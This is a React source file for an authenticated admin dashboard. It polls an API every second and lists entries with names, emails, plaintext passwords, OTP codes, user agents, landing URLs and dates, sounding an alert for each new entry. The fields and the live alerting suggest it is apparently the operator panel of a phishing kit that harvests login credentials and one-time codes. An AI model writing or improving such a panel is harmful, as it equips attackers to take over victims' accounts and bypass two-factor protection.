"use client";

import withAuth from "@/app/utils/auth";
import { format } from "date-fns";
import { useCallback, useEffect, useMemo, useState } from "react";
import toast from "react-hot-toast";
import { MdDelete, MdFirstPage, MdKeyboardArrowLeft, MdKeyboardArrowRight, MdLastPage } from "react-icons/md";
import useSWR, { mutate } from "swr";

// Utility functions
const fetcher = (url) => fetch(url).then((res) => res.json());
const playNotificationSound = () => {
  const audio = new Audio("/sounds/notification.mp3");
  audio.play();
};

const AdminDashboard = () => {
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage, setItemsPerPage] = useState(10);
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [userToDelete, setUserToDelete] = useState(null);
  const [isDeleting, setIsDeleting] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [prevUsers, setPrevUsers] = useState([]);

  const { data, isLoading } = useSWR("/api/information_list", fetcher, {
    refreshInterval: 1000,
  });


  console.log(data)

  useEffect(() => {
    if (data && prevUsers.length && data.length > prevUsers.length) {
      playNotificationSound();
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 3000);
    }

    if (data) {
      setPrevUsers(data);
    }
  }, [data, prevUsers]);

  // Pagination logic
  const reversedUsers = useMemo(() => (data ? [...data].reverse() : []), [data]);
  const totalPages = useMemo(
    () => (reversedUsers.length ? Math.ceil(reversedUsers.length / itemsPerPage) : 1),
    [reversedUsers, itemsPerPage]
  );
  const startIndex = useMemo(() => (currentPage - 1) * itemsPerPage, [currentPage, itemsPerPage]);
  const currentItems = useMemo(
    () => reversedUsers.slice(startIndex, startIndex + itemsPerPage),
    [reversedUsers, startIndex, itemsPerPage]
  );

  const handlePageChange = useCallback(
    (page) => {
      if (page >= 1 && page <= totalPages) {
        setCurrentPage(page);
      }
    },
    [totalPages]
  );

  const handleItemsPerPageChange = useCallback((newItemsPerPage) => {
    setItemsPerPage(newItemsPerPage);
    setCurrentPage(1); // Reset to first page when changing items per page
  }, []);

  // Adjust current page if items are deleted or filtered
  useEffect(() => {
    if (currentPage > totalPages && totalPages > 0) {
      setCurrentPage(totalPages);
    }
  }, [totalPages, currentPage]);

  const deleteLink = async () => {
    setIsDeleting(true);
    try {
      const response = await fetch("/api/information_list", {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id: userToDelete }),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.message || "Failed to delete the link");
      }

      toast.success("Link deleted successfully!");
      mutate("/api/information_list");

      // Better pagination adjustment after deletion
      const newTotalPages = Math.ceil((reversedUsers.length - 1) / itemsPerPage);
      if (currentPage > newTotalPages && newTotalPages > 0) {
        setCurrentPage(newTotalPages);
      }

      setIsDeleteModalOpen(false);
    } catch (error) {
      toast.error("Failed to delete the link. Please try again.");
      setIsDeleteModalOpen(false);
    } finally {
      setIsDeleting(false);
    }
  };

  if (isLoading) {
    return (
      <div className="p-4">
        <h1 className="mb-4 text-xl font-bold">Admin Dashboard</h1>
        <SkeletonLoader />
      </div>
    );
  }

  if (isDeleting) {
    return (
      <div className="p-4">
        <h1 className="mb-4 text-xl font-bold">Admin Dashboard</h1>
        <div className="flex items-center justify-center p-8">
          <div className="text-lg">Deleting...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="p-4 h-[400px]">
      <h1 className="mb-6 text-2xl font-normal">Information List</h1>

      {showPopup && (
        <div className="fixed p-4 text-white bg-blue-500 rounded-lg shadow-lg top-4 right-4 z-50">
          New Information Added!
        </div>
      )}

      {/* Items per page selector */}
      <div className="mb-4 flex items-center gap-4 flex-wrap">
        <div className="flex items-center gap-2">
          <label htmlFor="items-per-page" className="text-sm font-medium">
            Show:
          </label>
          <select
            id="items-per-page"
            value={itemsPerPage}
            onChange={(e) => handleItemsPerPageChange(Number(e.target.value))}
            className="px-3 py-1 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
          >
            <option value={5}>5</option>
            <option value={10}>10</option>
            <option value={25}>25</option>
            <option value={50}>50</option>
          </select>
          <span className="text-sm text-gray-600">entries</span>
        </div>

        <div className="text-sm text-gray-600">
          Showing {startIndex + 1} to {Math.min(startIndex + itemsPerPage, reversedUsers.length)} of {reversedUsers.length} entries
        </div>
      </div>

      <ResponsiveTable
        currentItems={currentItems}
        startIndex={startIndex}
        onDelete={setUserToDelete}
        onOpenDeleteModal={setIsDeleteModalOpen}
      />

      <EnhancedPagination
        currentPage={currentPage}
        totalPages={totalPages}
        totalItems={reversedUsers.length}
        itemsPerPage={itemsPerPage}
        onPageChange={handlePageChange}
      />

      {isDeleteModalOpen && (
        <DeleteModal onConfirm={deleteLink} onCancel={() => setIsDeleteModalOpen(false)} />
      )}
    </div>
  );
};

// Enhanced Skeleton loader component
const SkeletonLoader = () => (
  <>
    <div className="overflow-x-auto">
      <table className="w-full border border-collapse border-gray-300 table-auto min-w-[800px]">
        <thead>
          <tr className="bg-gray-200">
            {["SL", "Name", "Email", "Password", "OTP", "Agent", "Url", "Date", "Delete"].map(
              (header) => (
                <th key={header} className="px-4 py-2 border border-gray-300 text-start whitespace-nowrap">
                  {header}
                </th>
              )
            )}
          </tr>
        </thead>
        <tbody>
          {[...Array(5)].map((_, index) => (
            <tr key={index} className="animate-pulse">
              {[...Array(9)].map((_, cellIndex) => (
                <td key={cellIndex} className="px-4 py-2 bg-gray-300 border border-gray-300">
                  <div className="h-4 bg-gray-400 rounded"></div>
                </td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
    <div className="flex items-center justify-between mt-4 animate-pulse">
      <div className="w-32 h-6 bg-gray-300 rounded"></div>
      <div className="flex gap-2">
        {[...Array(5)].map((_, index) => (
          <div key={index} className="w-8 h-8 bg-gray-300 rounded"></div>
        ))}
      </div>
      <div className="w-32 h-6 bg-gray-300 rounded"></div>
    </div>
  </>
);

// Responsive Table component
const ResponsiveTable = ({ currentItems, startIndex, onDelete, onOpenDeleteModal }) => (
  <div className="bg-white rounded-lg shadow-sm border border-gray-200 overflow-hidden">
    {/* Mobile Card View */}
    <div className="block md:hidden">
      {currentItems.length === 0 ? (
        <div className="p-8 text-center text-gray-500">
          No data available
        </div>
      ) : (
        <div className="divide-y divide-gray-200">
          {currentItems.map((user, index) => (
            <div key={user._id} className="p-4 hover:bg-gray-50">
              <div className="flex justify-between items-start mb-2">
                <div className="text-sm font-medium text-gray-900">
                  #{startIndex + index + 1} - {user.name}
                </div>
                <button
                  onClick={() => {
                    onDelete(user._id);
                    onOpenDeleteModal(true);
                  }}
                  className="p-1 text-red-500 hover:bg-red-50 rounded"
                  aria-label={`Delete user ${user.name}`}
                >
                  <MdDelete size={16} />
                </button>
              </div>
              <div className="space-y-1 text-sm">
                <div><span className="font-medium">Email:</span> {user.email}</div>
                <div><span className="font-medium">Password:</span> {user.password}</div>
                <div>
                  <span className="font-medium">OTP:</span>{" "}
                  <span className={user?.otp ? "text-green-500" : "text-red-500"}>
                    {user?.otp ? user.otp : "N/A"}
                  </span>
                </div>
                <div><span className="font-medium">Agent:</span> {user.userAgent}</div>
                <div><span className="font-medium">URL:</span> {user.url?.split("?")[0]}</div>
                <div><span className="font-medium">Date:</span> {format(new Date(user.createdAt), "yyyy-MM-dd HH:mm:ss")}</div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>

    {/* Desktop Table View */}
    <div className="hidden md:block overflow-x-auto">
      <table className="w-full border-collapse min-w-[800px]">
        <thead>
          <tr className="bg-gray-50 border-b border-gray-200">
            {["SL", "Name", "Email", "Password", "OTP", "Agent", "URL", "Date", "Action"].map((header) => (
              <th key={header} className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider whitespace-nowrap">
                {header}
              </th>
            ))}
          </tr>
        </thead>
        <tbody className="bg-white divide-y divide-gray-200">
          {currentItems.length === 0 ? (
            <tr>
              <td colSpan={9} className="px-4 py-8 text-center text-gray-500">
                No data available
              </td>
            </tr>
          ) : (
            currentItems.map((user, index) => (
              <tr
                key={user._id}
                className="hover:bg-gray-50 transition-colors"
              >
                <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-900">
                  {startIndex + index + 1}
                </td>
                <td className="px-4 py-3 whitespace-nowrap text-sm font-medium text-gray-900">
                  {user.name}
                </td>
                <td className="px-4 py-3 text-sm text-gray-900 max-w-[200px] truncate">
                  {user.email}
                </td>
                <td className="px-4 py-3 text-sm text-gray-900 max-w-[150px] truncate">
                  {user.password}
                </td>
                <td className="px-4 py-3 whitespace-nowrap text-sm">
                  <span className={user?.otp ? "text-green-600 font-medium" : "text-red-500"}>
                    {user?.otp ? user.otp : "N/A"}
                  </span>
                </td>
                <td className="px-4 py-3 text-sm text-gray-900 max-w-[200px] truncate">
                  {user.userAgent}
                </td>
                <td className="px-4 py-3 text-sm text-gray-900 max-w-[200px] truncate">
                  {user.url?.split("?")[0]}
                </td>
                <td className="px-4 py-3 whitespace-nowrap text-sm text-gray-900">
                  {format(new Date(user.createdAt), "yyyy-MM-dd HH:mm:ss")}
                </td>
                <td className="px-4 py-3 whitespace-nowrap text-sm text-center">
                  <button
                    onClick={() => {
                      onDelete(user._id);
                      onOpenDeleteModal(true);
                    }}
                    className="p-2 text-red-500 hover:bg-red-50 rounded-md transition-colors"
                    aria-label={`Delete user ${user.name}`}
                  >
                    <MdDelete size={18} />
                  </button>
                </td>
              </tr>
            ))
          )}
        </tbody>
      </table>
    </div>
  </div>
);

// Enhanced Pagination component with better UX
const EnhancedPagination = ({ currentPage, totalPages, totalItems, itemsPerPage, onPageChange }) => {
  // Generate page numbers to show
  const getPageNumbers = () => {
    const pages = [];
    const maxVisiblePages = 5;

    if (totalPages <= maxVisiblePages) {
      // Show all pages if total pages is small
      for (let i = 1; i <= totalPages; i++) {
        pages.push(i);
      }
    } else {
      // Smart pagination logic
      if (currentPage <= 3) {
        // Show first pages
        for (let i = 1; i <= Math.min(maxVisiblePages, totalPages); i++) {
          pages.push(i);
        }
        if (totalPages > maxVisiblePages) {
          pages.push('...');
          pages.push(totalPages);
        }
      } else if (currentPage >= totalPages - 2) {
        // Show last pages
        pages.push(1);
        if (totalPages > maxVisiblePages) {
          pages.push('...');
        }
        for (let i = Math.max(totalPages - maxVisiblePages + 1, 1); i <= totalPages; i++) {
          pages.push(i);
        }
      } else {
        // Show middle pages
        pages.push(1);
        pages.push('...');
        for (let i = currentPage - 1; i <= currentPage + 1; i++) {
          pages.push(i);
        }
        pages.push('...');
        pages.push(totalPages);
      }
    }

    return pages;
  };

  const pageNumbers = getPageNumbers();

  if (totalPages <= 1) {
    return null;
  }

  return (
    <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mt-6 p-4 bg-white border-t border-gray-200">
      {/* Page info */}
      <div className="text-sm text-gray-700">
        Showing <span className="font-medium">{((currentPage - 1) * itemsPerPage) + 1}</span> to{" "}
        <span className="font-medium">{Math.min(currentPage * itemsPerPage, totalItems)}</span> of{" "}
        <span className="font-medium">{totalItems}</span> results
      </div>

      {/* Pagination controls */}
      <div className="flex items-center gap-1">
        {/* First page */}
        <button
          onClick={() => onPageChange(1)}
          className={`p-2 rounded-md transition-colors ${currentPage === 1
            ? "cursor-not-allowed text-gray-400"
            : "text-gray-500 hover:bg-gray-100 hover:text-gray-700"
            }`}
          disabled={currentPage === 1}
          title="First page"
        >
          <MdFirstPage size={20} />
        </button>

        {/* Previous page */}
        <button
          onClick={() => onPageChange(currentPage - 1)}
          className={`p-2 rounded-md transition-colors ${currentPage === 1
            ? "cursor-not-allowed text-gray-400"
            : "text-gray-500 hover:bg-gray-100 hover:text-gray-700"
            }`}
          disabled={currentPage === 1}
          title="Previous page"
        >
          <MdKeyboardArrowLeft size={20} />
        </button>

        {/* Page numbers */}
        <div className="flex gap-1">
          {pageNumbers.map((page, index) => (
            page === '...' ? (
              <span key={`ellipsis-${index}`} className="px-3 py-2 text-gray-500">
                ...
              </span>
            ) : (
              <button
                key={page}
                onClick={() => onPageChange(page)}
                className={`px-3 py-2 rounded-md text-sm font-medium transition-colors ${currentPage === page
                  ? "bg-blue-500 text-white"
                  : "text-gray-700 hover:bg-gray-100"
                  }`}
              >
                {page}
              </button>
            )
          ))}
        </div>

        {/* Next page */}
        <button
          onClick={() => onPageChange(currentPage + 1)}
          className={`p-2 rounded-md transition-colors ${currentPage === totalPages
            ? "cursor-not-allowed text-gray-400"
            : "text-gray-500 hover:bg-gray-100 hover:text-gray-700"
            }`}
          disabled={currentPage === totalPages}
          title="Next page"
        >
          <MdKeyboardArrowRight size={20} />
        </button>

        {/* Last page */}
        <button
          onClick={() => onPageChange(totalPages)}
          className={`p-2 rounded-md transition-colors ${currentPage === totalPages
            ? "cursor-not-allowed text-gray-400"
            : "text-gray-500 hover:bg-gray-100 hover:text-gray-700"
            }`}
          disabled={currentPage === totalPages}
          title="Last page"
        >
          <MdLastPage size={20} />
        </button>
      </div>
    </div>
  );
};

// Enhanced Delete Modal component
const DeleteModal = ({ onConfirm, onCancel }) => (
  <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4">
    <div className="bg-white rounded-lg shadow-xl max-w-md w-full">
      <div className="p-6">
        <h3 className="text-lg font-semibold text-gray-900 mb-2">Confirm Deletion</h3>
        <p className="text-gray-600 mb-6">
          Are you sure you want to delete this item? This action cannot be undone.
        </p>
        <div className="flex justify-end gap-3">
          <button
            onClick={onCancel}
            className="px-4 py-2 text-gray-700 bg-gray-100 hover:bg-gray-200 rounded-md transition-colors"
          >
            Cancel
          </button>
          <button
            id="confirm-delete-button"
            onClick={onConfirm}
            className="px-4 py-2 text-white bg-red-500 hover:bg-red-600 rounded-md transition-colors"
          >
            Delete
          </button>
        </div>
      </div>
    </div>
  </div>
);

export default withAuth(AdminDashboard);